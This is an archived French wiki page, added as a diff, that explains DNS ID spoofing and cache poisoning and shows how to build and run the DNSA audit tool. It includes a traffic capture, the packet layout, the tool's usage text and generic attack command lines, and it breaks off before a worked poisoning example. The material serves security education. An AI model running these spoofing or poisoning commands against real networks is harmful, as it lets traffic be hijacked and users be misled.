@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr" class="client-nojs">
+<head>
+<meta charset="UTF-8" />
+<title>Audits de sécurité du protocole DNS - Deimos.fr / Bloc Notes Informatique</title>
+<meta name="generator" content="MediaWiki 1.25.5" />
+<link rel="shortcut icon" href="https://wiki.deimos.fr/favicon.ico" />
+<link rel="search" type="application/opensearchdescription+xml" href="opensearch_desc.php" title="Deimos.fr / Bloc Notes Informatique (en)" />
+<link rel="EditURI" type="application/rsd+xml" href="https://wiki.deimos.fr/api.php?action=rsd" />
+<link rel="alternate" hreflang="x-default" href="Audits_de_sécurité_du_protocole_DNS.html" />
+<link rel="copyright" href="http://creativecommons.org/licenses/by-nc-sa/3.0/deed.fr" />
+<link rel="alternate" type="application/atom+xml" title="Deimos.fr / Bloc Notes Informatique Atom feed" href="https://wiki.deimos.fr/index.php?title=Special:RecentChanges&amp;feed=atom" />
+<link rel="stylesheet" href="load.php%3Fdebug=false&amp;lang=en&amp;modules=mediawiki.legacy.commonPrint,shared|mediawiki.sectionAnchor|mediawiki.skinning.interface|mediawiki.ui.button|skins.vector.styles&amp;only=styles&amp;skin=vector&amp;*.css" />
+<meta name="ResourceLoaderDynamicStyles" content="" />
+<link rel="stylesheet" href="load.php%3Fdebug=false&amp;lang=en&amp;modules=site&amp;only=styles&amp;skin=vector&amp;*.css" />
+<style>a:lang(ar),a:lang(kk-arab),a:lang(mzn),a:lang(ps),a:lang(ur){text-decoration:none}
+/* cache key: blocnotesinfo-wiki_:resourceloader:filter:minify-css:7:6f8c0c45eefd74c7bbe9478b32df38c0 */</style>
+<script src="load.php%3Fdebug=false&amp;lang=en&amp;modules=startup&amp;only=scripts&amp;skin=vector&amp;*"></script>
+<script>if(window.mw){
+mw.config.set({"wgCanonicalNamespace":"","wgCanonicalSpecialPageName":false,"wgNamespaceNumber":0,"wgPageName":"Audits_de_sécurité_du_protocole_DNS","wgTitle":"Audits de sécurité du protocole DNS","wgCurRevisionId":5286,"wgRevisionId":5286,"wgArticleId":2367,"wgIsArticle":true,"wgIsRedirect":false,"wgAction":"view","wgUserName":null,"wgUserGroups":["*"],"wgCategories":[],"wgBreakFrames":false,"wgPageContentLanguage":"en","wgPageContentModel":"wikitext","wgSeparatorTransformTable":["",""],"wgDigitTransformTable":["",""],"wgDefaultDateFormat":"dmy","wgMonthNames":["","January","February","March","April","May","June","July","August","September","October","November","December"],"wgMonthNamesShort":["","Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"],"wgRelevantPageName":"Audits_de_sécurité_du_protocole_DNS","wgRelevantArticleId":2367,"wgIsProbablyEditable":false,"wgRestrictionEdit":[],"wgRestrictionMove":[],"wgWikiEditorEnabledModules":{"toolbar":true,"dialogs":true,"hidesig":true,"preview":true,"publish":false}});
+}</script><script>if(window.mw){
+mw.loader.implement("user.options",function($,jQuery){mw.user.options.set({"variant":"en"});});mw.loader.implement("user.tokens",function($,jQuery){mw.user.tokens.set({"editToken":"+\\","patrolToken":"+\\","watchToken":"+\\"});});
+/* cache key: blocnotesinfo-wiki_:resourceloader:filter:minify-js:7:a5c52c063dc436c1ca7c9f456936a5e9 */
+}</script>
+<script>if(window.mw){
+mw.loader.load(["mediawiki.page.startup","mediawiki.legacy.wikibits","mediawiki.legacy.ajax","skins.vector.js"]);
+}</script>
+<style type="text/css">/*<![CDATA[*/
+.source-text {line-height: normal;}
+.source-text li, .source-text pre {
+	line-height: normal; border: 0px none white;
+}
+/**
+ * GeSHi Dynamically Generated Stylesheet
+ * --------------------------------------
+ * Dynamically generated stylesheet for text
+ * CSS class: source-text, CSS id: 
+ * GeSHi (C) 2004 - 2007 Nigel McNie, 2007 - 2008 Benny Baumann
+ * (http://qbnz.com/highlighter/ and http://geshi.org/)
+ * --------------------------------------
+ */
+.text.source-text .de1, .text.source-text .de2 {font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;font-family: monospace, monospace;}
+.text.source-text  {font-family:monospace;}
+.text.source-text .imp {font-weight: bold; color: red;}
+.text.source-text li, .text.source-text .li1 {font-weight: normal; vertical-align:top;}
+.text.source-text .ln {width:1px;text-align:right;margin:0;padding:0 2px;vertical-align:top;}
+.text.source-text .li2 {font-weight: bold; vertical-align:top;}
+.text.source-text .ln-xtra, .text.source-text li.ln-xtra, .text.source-text div.ln-xtra {background-color: #ffc;}
+.text.source-text span.xtra { display:block; }
+
+/*]]>*/
+</style>
+<!--[if lt IE 7]><style type="text/css">body{behavior:url("/skins/Vector/csshover.min.htc")}</style><![endif]-->
+</head>
+<body class="mediawiki ltr sitedir-ltr ns-0 ns-subject page-Audits_de_sécurité_du_protocole_DNS skin-vector action-view vector-animateLayout">
+		<div id="mw-page-base" class="noprint"></div>
+		<div id="mw-head-base" class="noprint"></div>
+		<div id="content" class="mw-body" role="main">
+			<a id="top"></a>
+
+						<h1 id="firstHeading" class="firstHeading" lang="en"><span dir="auto">Audits de sécurité du protocole DNS</span></h1>
+						<div id="bodyContent" class="mw-body-content">
+									<div id="siteSub">From Deimos.fr / Bloc Notes Informatique</div>
+								<div id="contentSub"></div>
+												<div id="jump-to-nav" class="mw-jump">
+					Jump to:					<a href="Audits_de_sécurité_du_protocole_DNS.html#mw-navigation">navigation</a>, 					<a href="Audits_de_sécurité_du_protocole_DNS.html#p-search">search</a>
+				</div>
+				<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><div id="toc" class="toc"><div id="toctitle"><h2>Contents</h2></div>
+<ul>
+<li class="toclevel-1 tocsection-1"><a href="Audits_de_sécurité_du_protocole_DNS.html#Introduction_.C3.A0_la_s.C3.A9curit.C3.A9_du_protocole_DNS"><span class="tocnumber">1</span> <span class="toctext">Introduction à la sécurité du protocole DNS</span></a></li>
+<li class="toclevel-1 tocsection-2"><a href="Audits_de_sécurité_du_protocole_DNS.html#Mises_en_.C3.A9vidence_des_failles_DNS"><span class="tocnumber">2</span> <span class="toctext">Mises en évidence des failles DNS</span></a>
+<ul>
+<li class="toclevel-2 tocsection-3"><a href="Audits_de_sécurité_du_protocole_DNS.html#Capture_d.E2.80.99une_requ.C3.AAte_DNS_standard_et_inverse"><span class="tocnumber">2.1</span> <span class="toctext">Capture d’une requête DNS standard et inverse</span></a></li>
+<li class="toclevel-2 tocsection-4"><a href="Audits_de_sécurité_du_protocole_DNS.html#DNS_ID_Spoofing"><span class="tocnumber">2.2</span> <span class="toctext">DNS ID Spoofing</span></a></li>
+<li class="toclevel-2 tocsection-5"><a href="Audits_de_sécurité_du_protocole_DNS.html#DNS_ID_d.E2.80.99une_transaction_DNS"><span class="tocnumber">2.3</span> <span class="toctext">DNS ID d’une transaction DNS</span></a></li>
+<li class="toclevel-2 tocsection-6"><a href="Audits_de_sécurité_du_protocole_DNS.html#Attaque_de_DNS_ID_Spoofing_sur_un_serveur_DNS"><span class="tocnumber">2.4</span> <span class="toctext">Attaque de DNS ID Spoofing sur un serveur DNS</span></a></li>
+<li class="toclevel-2 tocsection-7"><a href="Audits_de_sécurité_du_protocole_DNS.html#DNS_Cache_poisoning"><span class="tocnumber">2.5</span> <span class="toctext">DNS Cache poisoning</span></a></li>
+<li class="toclevel-2 tocsection-8"><a href="Audits_de_sécurité_du_protocole_DNS.html#Payload_d.E2.80.99un_paquet_DNS"><span class="tocnumber">2.6</span> <span class="toctext">Payload d’un paquet DNS</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-9"><a href="Audits_de_sécurité_du_protocole_DNS.html#Installation_et_configuration_de_DNSA"><span class="tocnumber">3</span> <span class="toctext">Installation et configuration de DNSA</span></a>
+<ul>
+<li class="toclevel-2 tocsection-10"><a href="Audits_de_sécurité_du_protocole_DNS.html#Fichiers"><span class="tocnumber">3.1</span> <span class="toctext">Fichiers</span></a></li>
+<li class="toclevel-2 tocsection-11"><a href="Audits_de_sécurité_du_protocole_DNS.html#Fonctionnement_.C2.AB_bas_niveau_.C2.BB"><span class="tocnumber">3.2</span> <span class="toctext">Fonctionnement «&#160;bas niveau&#160;»</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-12"><a href="Audits_de_sécurité_du_protocole_DNS.html#Utilisation_de_DNSA"><span class="tocnumber">4</span> <span class="toctext">Utilisation de DNSA</span></a>
+<ul>
+<li class="toclevel-2 tocsection-13"><a href="Audits_de_sécurité_du_protocole_DNS.html#Pr.C3.A9sentation_g.C3.A9n.C3.A9rale"><span class="tocnumber">4.1</span> <span class="toctext">Présentation générale</span></a></li>
+<li class="toclevel-2 tocsection-14"><a href="Audits_de_sécurité_du_protocole_DNS.html#Utilisation"><span class="tocnumber">4.2</span> <span class="toctext">Utilisation</span></a>
+<ul>
+<li class="toclevel-3 tocsection-15"><a href="Audits_de_sécurité_du_protocole_DNS.html#Utilisation_Ethernet"><span class="tocnumber">4.2.1</span> <span class="toctext">Utilisation Ethernet</span></a></li>
+<li class="toclevel-3 tocsection-16"><a href="Audits_de_sécurité_du_protocole_DNS.html#Utilisation_WiFi"><span class="tocnumber">4.2.2</span> <span class="toctext">Utilisation WiFi</span></a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-17"><a href="Audits_de_sécurité_du_protocole_DNS.html#Conclusion"><span class="tocnumber">5</span> <span class="toctext">Conclusion</span></a></li>
+<li class="toclevel-1 tocsection-18"><a href="Audits_de_sécurité_du_protocole_DNS.html#References"><span class="tocnumber">6</span> <span class="toctext">References</span></a></li>
+</ul>
+</div>
+
+<h1><span class="mw-headline" id="Introduction_.C3.A0_la_s.C3.A9curit.C3.A9_du_protocole_DNS"><span class="mw-headline-number">1</span> Introduction à la sécurité du protocole DNS</span></h1>
+<p>DNS est utilisé dans la majeure partie des réseaux locaux cependant il a été développé avec des contraintes fortes de performance, au détriment de sa sécurité, afin de ne pas dégrader le trafic régulier de par le nombre conséquent de requêtes qui est associé à la nature de ce protocole.
+</p><p>DNS ( <a rel="nofollow" class="external text" href="http://fr.wikipedia.org/wiki/Domain_Name_System">Domain Naming System</a> ) est un des protocoles clefs d'Internet, avec plusieurs grands protocoles de routage et notamment BGPv4 ( <a rel="nofollow" class="external text" href="http://fr.wikipedia.org/wiki/Border_Gateway_Protocol">Border Gateway Protocol</a> ). Il est également utilisé dans la majeure partie des réseaux locaux actuels avec, selon la topologie retenue, un ou plusieurs serveur(s) DNS interne(s).
+</p><p>Cet ancien protocole n'a pas été développé avec des contraintes fortes de sécurité, mais principalement des contraintes de performances. Le critère retenu étant à l'époque l'optimisation des performances qui ne devaient globalement pas dégrader le trafic en raison de la fréquence importante de ces requêtes.
+</p><p>DNS étant au centre de toutes les communications IP (comment Internet pourrait-il fonctionner aujourd’hui sans la résolution des noms&#160;?), il représente un pilier des communications et est donc une cible de choix pour des attaquants désireux de détourner du trafic afin de l’écouter, le modifier, ou directement en injecter.
+</p><p>DNS, dans sa version originale - celle qui est encore actuellement la plus utilisée - comporte plusieurs failles intrinsèques qui ne peuvent être corrigées, à moins d'utiliser <a rel="nofollow" class="external text" href="http://www.dnssec.net/">DNSSec</a> ou combiner différentes couches de sécurité à plusieurs niveaux différents ( <a rel="nofollow" class="external text" href="http://fr.wikipedia.org/wiki/IPsec">IPSec</a> , etc.).
+</p><p>Il est cependant possible de limiter considérablement les risques en adaptant la topologie du réseau (Local Area Network, zone démilitarisée DMZ, etc.). Les DNS secondaires (mis à jour avec les fameux «&#160;transferts de zone&#160;») peuvent également être la cible d’attaques visant un réseau particulier.
+</p><p>La majeure partie des transactions DNS s’effectue sur le port 53/UDP, hormis les requêtes de tailles trop importantes ou les transferts de zone qui transitent sur le port 53/TCP. Tout au long de cet article, les attaques et contre-mesures décrites concernent quasi-exclusivement les paquets <a rel="nofollow" class="external text" href="http://fr.wikipedia.org/wiki/User_Datagram_Protocol">UDP</a> du trafic DNS.
+</p><p>DNSA (DNS Auditing tool) est un "couteau suisse" de la sécurité du point de vue de la résolution de noms. Il peut être utilisé conjointement avec un scanner de vulnérabilités pour identifier les différents serveurs DNS (primaires et secondaires), identifier les types et versions des serveurs, etc.
+</p><p>Des outils tels que DIG ( <a rel="nofollow" class="external text" href="http://www.linux.com/articles/113992">Domain Information Groper</a> ), host, ou encore nslookup permettent d’interroger les serveurs DNS de façon interactive et ainsi récolter de nombreuses informations qui seront ensuite utiles au traitement avec DNSA.
+</p>
+<h1><span class="mw-headline" id="Mises_en_.C3.A9vidence_des_failles_DNS"><span class="mw-headline-number">2</span> Mises en évidence des failles DNS</span></h1>
+<p>Les failles DNS peuvent être exploitées par des attaques de type DNS ID Spoofing et des d’attaques conceptuelles intrinsèques au protocole DNS. Les attaques de ce dossier sont basées sur l'usurpation afin d'exécuter une élévation de privilèges, l’exemple d'attaque de Cache Poisoning concerne ici la corruption du champ «&#160;additional record&#160;».
+</p><p>Les failles DNS abordées dans cet article sont toutes implémentées dans l’outil DNSA. Il s’agit, pour les attaques de DNS ID Spoofing, d’attaques conceptuelles intrinsèques au protocole DNS. Comme pour toutes les attaques dites de «&#160;Spoofing&#160;» ou usurpation, le but est de se faire passer pour un tiers afin d’obtenir des privilèges supplémentaires.
+</p><p>Dans toutes les attaques présentées ci-dessous, du «&#160;spoofing&#160;» est utilisé pour que la machine sur laquelle tourne DNSA passe pour le serveur DNS légitime interrogé. Pour l’attaque de Cache Poisoning (corruption de cache DNS ), celle retenue dans l’outil DNSA est la corruption du champ «&#160;additional record&#160;».
+</p>
+<h2><span class="mw-headline" id="Capture_d.E2.80.99une_requ.C3.AAte_DNS_standard_et_inverse"><span class="mw-headline-number">2.1</span> Capture d’une requête DNS standard et inverse</span></h2>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">root@linbox]\# tcpdump -i eth0 udp and port 53
+tcpdump: listening on ath0
+linbox.32783 &gt; ns1.fai.fr.domain: 30679+ A? www.google.fr. (30) (DF)
+ns1.fai.fr.domain &gt; linbox.32783: 30679 2/5/1 CNAME[|domain] (DF)
+ns1.fai.fr.domain &gt; linbox.32784: 25190* 1/4/4 (224) (DF)
+linbox.32785 &gt; ns1.fai.fr.domain: 30680+ PTR? 99.9.102.66.in-addr.arpa. (42) (DF)</pre></div></div>
+<p>Une requête DNS standard est une requête de type A. A est un nom d’hôte, CNAME un alias, MX un serveur de mail, etc… Il est également possible d’effectuer des requêtes inverses avec les enregistrements PTR afin de connaître le nom d’hôte d’une machine à partir de son IP. 
+</p>
+<h2><span class="mw-headline" id="DNS_ID_Spoofing"><span class="mw-headline-number">2.2</span> DNS ID Spoofing</span></h2>
+<p>L’attaque de DNS ID Spoofing utilise principalement&#160;:
+</p>
+<ul><li> Les faiblesses du protocole UDP qui n’assure aucune intégrité ou suivi des paquets. Des injections de trafic sont donc possibles sans disposer d’informations préalables&#160;;</li>
+<li> La connaissance ou le faible aléa du DNS ID, seule information codée sur 16 bits, soit 65535 combinaisons possibles, permettant de reconnaître la réponse à une requête envoyée.</li>
+<li> Dans le cas d’un DNS ID connu (même brin Ethernet, compromission d’une DMZ, etc.), l’attaque par DNS ID Spoofing est triviale en utilisant l’information récupérée dans l’écoute du trafic DNS et forgeant ensuite la réponse telle qu’elle aurait été envoyée par le serveur légitime.</li>
+<li> Pour un DNS ID inconnu (cas typique d’Internet avec 2 clients distants par exemple), des attaques sont possibles en réduisant la fenêtre des DNS ID possibles dans le cas d’un faible aléa avec des attaques dites de prédiction. De telles attaques ont déjà été implémentées sur les numéros de séquence TCP (<a rel="nofollow" class="external text" href="http://freshmeat.net/redir/p0f/43121/url%5C_homepage/p0f.shtml">p0f l’outil de reconnaissance passive d’OS utilisant cette technique</a> ) et peuvent être élargies au cas de DNS. </li></ul>
+<h2><span class="mw-headline" id="DNS_ID_d.E2.80.99une_transaction_DNS"><span class="mw-headline-number">2.3</span> DNS ID d’une transaction DNS</span></h2>
+<p>Dans une attaque typique, en considérant que le DNS ID peut être récupéré par une écoute passive du trafic, le principe est simple&#160;:
+</p>
+<ul><li> L'attaquant est à l’écoute des requêtes DNS</li>
+<li> Quand la requête à détourner est émise, il en extrait le DNS ID</li>
+<li> Il forge alors une réponse adéquate avec un paquet IP/UDP/DNS ayant le payload nécessaire, c'est-à-dire contenant l’IP source du serveur DNS légitime, l’IP destination du client qui avait émis la requête, le DNS ID récupéré ci-dessus, et les informations qu’il souhaite insérer.</li></ul>
+<p>Tous les «&#160;moteurs&#160;» de résolution de noms des systèmes d'exploitation actuels fonctionnent de la même façon&#160;: ils prennent en compte la première réponse à une requête effectuée puis ignorent les réponses suivantes. C’est le cas ici&#160;: DNSA répondant avant le serveur de noms légitime (car optimisé pour répondre très rapidement grâce aux fonctions de call-back de la libpcap), la requête du serveur légitime est alors ensuite ignorée.
+</p>
+<h2><span class="mw-headline" id="Attaque_de_DNS_ID_Spoofing_sur_un_serveur_DNS"><span class="mw-headline-number">2.4</span> Attaque de DNS ID Spoofing sur un serveur DNS</span></h2>
+<p>Puisqu’un serveur DNS peut se comporter comme un client quand il ne dispose pas de l’information en cache, celui-ci peut être détourné de la même façon qu’un client classique avec une attaque de DNS ID Spoofing. La condition nécessaire (et suffisante&#160;!) pour que l’attaque soit menée est d’être placé sur le même brin Ethernet que le serveur attaqué.
+</p><p>Plusieurs scénarios sont possibles (compromission d’une machine de la DMZ, d’un client du LAN…). Des exemples détaillés ont été présentés au Symposium 2005 sur la Sécurité des <a rel="nofollow" class="external text" href="http://actes.sstic.org/SSTIC05/Protocoles_reseau/SSTIC05-Betouin_Blancher_Fischbach-Protocoles_reseau.pdf">Technologies et des systèmes d’Information et de Communication</a>...
+</p>
+<h2><span class="mw-headline" id="DNS_Cache_poisoning"><span class="mw-headline-number">2.5</span> DNS Cache poisoning</span></h2>
+<p>Quand un client interroge son serveur de noms, si celui-ci dispose de l’information en cache («&#160;l’hôte www.hote.com est disponible à l’adresse IP x.x.x.x&#160;»), il lui répond directement. Dans le cas contraire, le serveur se comporte comme un client standard afin d’interroger le serveur DNS responsable du domaine.
+</p><p>Celui-ci lui répond alors avec l’information demandée, et peut s’il est configuré pour, inclure des enregistrements additionnels (additional records, ou addRR) afin d’éviter une surcharge de requêtes futures. Cette «&#160;option&#160;» a d’abord été intégrée sans vérification des domaines inscrits en enregistrements additionnels.
+</p><p>Un serveur pouvait donc répondre en incluant des addRR ne concernant pas le domaine pour lequel il répondait. Le détournement de flux est alors possible&#160;: un serveur contrôlé par un utilisateur malicieux pouvait, par exemple, renvoyer un enregistrement additionnel concernant le domaine microsoft.com et le faisant ainsi pointer vers la machine de son choix.
+</p>
+<h2><span class="mw-headline" id="Payload_d.E2.80.99un_paquet_DNS"><span class="mw-headline-number">2.6</span> Payload d’un paquet DNS</span></h2>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">Byte
+&#160;
+|---------------|---------------|---------------|---------------|
+1 2 3 4
+ID (cont) QR,OP,AA,TC,RD RA,0,AD,CD,CODE
+|---------------|---------------|---------------|---------------|
+4 # Questions 5 (Cont) 6 # Answers 7 (Cont)
+|---------------|---------------|---------------|---------------|
+8 # Authority 9 (Cont) 10 # Additional 11 (Cont)
+|---------------|---------------|---------------|---------------|
+Question Section
+|---------------|---------------|---------------|---------------|
+Answer Section
+|---------------|---------------|---------------|---------------|
+Authority Section
+|---------------|---------------|---------------|---------------|
+Additional Section Champ addRR
+|---------------|---------------|---------------|---------------|</pre></div></div>
+<p>Le payload d’un paquet DNS (ici après les en-têtes IP puis UDP) se compose de différents champs&#160;:
+</p>
+<ul><li> Le transaction ID (DNS ID), champs de 2 octets.</li>
+<li> Différents «&#160;flags&#160;» (drapeaux) positionnés afin de définir le type de paquet DNS&#160;: requête, réponse, etc…</li>
+<li> Le nombre de «&#160;questions&#160;» posées.</li>
+<li> Le nombre de «&#160;réponses&#160;» données.</li>
+<li> Les questions</li>
+<li> Les réponses.</li>
+<li> Les serveurs de noms (NS pour Name Server) responsables de la zone.</li>
+<li> Le fameux champ additionnel dans lequel diverses informations complémentaires peuvent être fournies.</li></ul>
+<h1><span class="mw-headline" id="Installation_et_configuration_de_DNSA"><span class="mw-headline-number">3</span> Installation et configuration de DNSA</span></h1>
+<p>dnsa-ng-0.6 utilise les librairies libnet-ng et libpcap qui devront être préalablement installées de préférence avec les versions de développement afin de disposer des fichiers d’en-tête les plus récents. Retrouvez également les explications et les détails sur le fonctionnement de bas niveau de l'outil DNSA (DNS Auditing Tool).
+</p><p>DNSA est disponible sur le site securitech.homeunix.org en archive au format tar.gz. Il utilise les librairies libnet ( libnet-ng dans ses versions récentes ) et libpcap, qui devront être installées préalablement.
+</p><p>Les détails de l'installation porteront sur la dernière version en date&#160;: dnsa-ng-0.6.
+</p><p>L'installation de la <a rel="nofollow" class="external text" href="http://www.tcpdump.org/">libpcap</a> peut s'effectuer, sur la grande majorité des architectures/distributions, via les paquets (deb, rpm, ...).
+</p><p>Il faut cependant veiller à installer la version de développement (en général, selon les distributions, suffixée par «&#160;-dev&#160;» ou «&#160;-devel&#160;») afin de disposer des fichiers d’en-tête, de l’aide, des pages «&#160;man&#160;», etc…
+</p><p>La libnet-ng - Libnet Next Generation - est disponible à l'adresse suivante <a rel="nofollow" class="external free" href="http://www.security-labs.org/libnetng">http://www.security-labs.org/libnetng</a>. Son installation s’effectue via les sources (archives tar.gz disponibles).
+</p><p>Pour une installation standard, la procédure est la suivante&#160;:
+</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">tar -zxvf ng-libnet-current.tar.gz
+cd libnet-ng
+./configure
+make
+make install</pre></div></div>
+<p>Le "make install" est facultatif car le chemin vers le repertoire de la libnet-ng peut être spécifié en argument lors de l'installation de DNSA. DNSA requiert les droits superutilisateurs (root) pour fonctionner, il est donc conseillé d'installer la libnet-ng en incluant la phase du "make install".
+</p><p>En effet, il n’est pas possible à un utilisateur «&#160;normal&#160;» de forger des paquets et de les envoyer sur une interface de son choix, pas plus que d’écouter passivement le trafic capturé son par l’interface réseau.
+</p><p>L'installation de DNSA peut commencer&#160;:
+</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">tar -zxvf dnsa-ng-0.6.tar.gz
+cd dnsa-ng-0.6
+cd sources
+./configure</pre></div></div>
+<p>La verbosité et le mode "debug" sont accessibles en compilant DNSA avec les options --with-ldflags=-lefence et --enable-debug. Il est possible de fixer les chemin vers la libpcap ou la libnet-ng avec les arguments "--with-libnet=[CHEMIN]" et "--with-libpcap=[CHEMIN]"
+</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">make
+make install</pre></div></div>
+<h2><span class="mw-headline" id="Fichiers"><span class="mw-headline-number">3.1</span> Fichiers</span></h2>
+<p>DNSA est livré avec une documentation détaillée permettant de l'utiliser de façon optimale.<br />
+docs/ contient des articles relatifs aux failles DNS ainsi que des exemples d'utilisation.<br />
+sources/ contient l’ensemble des codes sources de DNSA et le binaire après compilation.<br />
+man/ est actuellement vide dans la dernière version
+</p>
+<h2><span class="mw-headline" id="Fonctionnement_.C2.AB_bas_niveau_.C2.BB"><span class="mw-headline-number">3.2</span> Fonctionnement «&#160;bas niveau&#160;»</span></h2>
+<p>DNSA peut être utilisé dans 3 modes différents&#160;:
+</p>
+<ul><li> «&#160;DNS ID Spoofing&#160;» DNSA a été crée à l'origine pour mettre en évidence la simplicité d'attaques par DNS ID Spoofing. Ce mode est en général utilisé sur un même brin ethernet, même si des attaques complémentaires peuvent <a rel="nofollow" class="external text" href="http://actes.sstic.org/SSTIC05/Protocoles_reseau/SSTIC05-Betouin_Blancher_Fischbach-Protocoles_reseau.pdf">permettre des schémas très évolués</a>.</li>
+<li> «&#160;DNS ID Sniffing&#160;» Ce mode permet principalement de faire des analyses statistiques sur les distributions de DNS ID selon les serveurs ou OS utilisés. En effet, si l'aléa des distributions de DNS ID étaient dépendantes des anciens serveurs, l'aléa est désormais pris en charge par le système d'exploitation sur lequel le serveur tourne. Un exemple basé sur gnuplot, logiciel de tracé opensource ( libre ), est décrit dans la documentation de DNSA. Des évolutions futures du logiciel intégreront différents tests statistiques basés sur des regressions linéaires multiples.</li>
+<li> «&#160;DNS cache poisoning&#160;» Ce mode est destiné aux serveurs faillibles à ces types d'attaques. Citons notamment d'anciens Bind, MS Windows, ou plus récemment des appliances propriétaires de pare-feux. Le principe est de répondre au serveur attaqué avec des additional records forgés contenant des informations relatives à des domaines différents de celui interrogé. Les contre-mesures à ce type d'attaques sont donc faciles à mettre en place. Bien heureusement, de moins en moins de serveurs sont vulnérables aux attaques de DNS cache poisoning.</li></ul>
+<p>La dernière version de DNSA supporte les attaques sur des réseaux sans fil, au travers de deux cartes 802.11. De nouveaux patches sur différents drivers ( <a rel="nofollow" class="external text" href="http://madwifi.org/">madwifi notamment</a> ), permettent l'écoute et l'injection simultanées. Le mode "WiFi" permet d'écouter le trafic DNS sur la première carte, et d'injecter les trames forgées grâce à la seconde. Le mode "ether" est le mode standard utilisant des filtres pcap afin de sélectionner le contenu approprié.
+</p><p>DNSA n’a pas de moteur d’événements. Il utilise les fonctions de call-back de la librairie lipcap&#160;: le principe est de déclencher, lors du passage de paquets spécifiques définis à l’aide des filtres pcap, une fonction contenant le payload du paquet capturé ainsi que différents autres arguments&#160;:
+</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">void callback_dnsspoof(u_char *args, const struct pcap_pkthdr *pkthdr, const u_char *packet)
+{
+(…)
+}</pre></div></div>
+<p>Les paquets sont forgés à l’aide de la libnet(-ng) et de ses constructeurs prédéfinis pour la majorités des protocoles connus. 
+</p>
+<h1><span class="mw-headline" id="Utilisation_de_DNSA"><span class="mw-headline-number">4</span> Utilisation de DNSA</span></h1>
+<p>Description de l'exploitation, avec DNSA, des attaques présentées en partie 2 du dossier "DNS Auditing Tool". Les exemples d'exploitation avec DNSA sont disponibles en version Ethernet et en version WIFI. 
+</p>
+<h2><span class="mw-headline" id="Pr.C3.A9sentation_g.C3.A9n.C3.A9rale"><span class="mw-headline-number">4.1</span> Présentation générale</span></h2>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">Usage: ./dnsa-ng [OPTIONS]
+DNS Swiss knife tool
+&#160;
+REQUIRED&#160;: -m [mode] where mode can be raw4 or link (depending of your network topology)
+REQUIRED&#160;: -t [media] where media can be 'wifi' or 'ether'
+* 'wifi'&#160;: needs 2 cards as describe in the documentation, needs the -I option to specify the interface which will inject packets
+* 'ether'&#160;: doesn't need further options)
+&#160;
+-1 DNS ID spoofing [ Required&#160;: -S ]
+-D [www.domain.org] Hostname query to fool.
+Don't use it if every DNS request sniffed has to be spoofed
+-S [IP] IP address to send for DNS queries
+-s [IP] IP address of the host to fool
+-i [interface] IP address to send for DNS queries
+&#160;
+-2 DNS IDs Sniffing [ Required&#160;: -s ] (Beta and not finished)
+-s [IP] IP address of the server which makes queries
+-w [file] Output file for DNS IDs
+&#160;
+-3 DNS cache poisoning [ Required&#160;: -S AND -a AND -b]
+-a [host.domain.org] Hostname to send in the additional record
+-b [IP] IP to send in the additional record
+-D [www.domain.org] Hostname for query. Use it if you want to fool just one
+-S [IP] IP address to send for DNS queries (the normal one)
+-s [IP] IP address of the server to fool
+-i [interface] IP address to send for DNS queries
+&#160;
+-h Print usage
+Bug reports to Pierre BETOUIN</pre></div></div>
+<h2><span class="mw-headline" id="Utilisation"><span class="mw-headline-number">4.2</span> Utilisation</span></h2>
+<p>Le mode «&#160;-1&#160;» concerne les attaques par DNS ID Spoofing.
+</p>
+<h3><span class="mw-headline" id="Utilisation_Ethernet"><span class="mw-headline-number">4.2.1</span> Utilisation Ethernet</span></h3>
+<pre>./dnsa-ng -m [raw4 ou link] -1 -D [NOM DE DOMAINE OU DE MACHINE] -S IP_A_ENVOYER -s CLIENT_A_LEURRER -i INTERFACE -t ether
+</pre>
+<p>Les arguments «&#160;-S&#160;» et «&#160;-s&#160;» sont donc des filtres permettant d’affiner les restrictions des clients à attaquer. S’ils ne sont pas spécifiés, toutes les requêtes DNS seront concernées.
+</p>
+<h3><span class="mw-headline" id="Utilisation_WiFi"><span class="mw-headline-number">4.2.2</span> Utilisation WiFi</span></h3>
+<pre>./dnsa-ng -m [raw4 ou link] -1 -D [NOM DE DOMAINE OU DE MACHINE] -S IP_A_ENVOYER -s CLIENT_A_LEURRER -i ath0 -t wifi -I wlan0
+</pre>
+<p>L’utilisation en WiFi est la même, à la spécification des interfaces près. Dans le mode WiFi, une interface capture le trafic brut et une autre se charge d’injecter le trafic. L’interface «&#160;-i&#160;» capture le trafic passivement tandis que l’interface «&#160;-I&#160;» injecte les paquets forgés. Le mode «&#160;-3&#160;» concerne les attaques de DNS cache poisoning décrites plus haut, la commande générique de cette attaque est la suivante&#160;:
+</p>
+<pre>./dnsa-ng -t ether -m [raw4 ou link] -3 -D [HOTE RECHERCHE] -S [IP LEGITIME DE L’HOTE] -s [SERVEUR DNS EFFECUANT LA REQUETE] -a [ADDRR A AJOUTER] -b [IP DE L’ADDRR A AJOUTER] -i [INTERFACE]
+</pre>
+<p>L’exemple suivant concerne une requête effectuée sur le domaine pirate.org à la recherche du nom d’hôte «&#160;hacker&#160;» ayant pour IP 100.101.102.103. Le serveur DNS effectuant la recherche est le serveur 192.168.1.100. L’enregistrement additionnel concerne le FQDN www.microsoft.com en lui affectant l’IP 1.2.3.4. L’interface d’injection est la carte réseau eth0.
+</p>
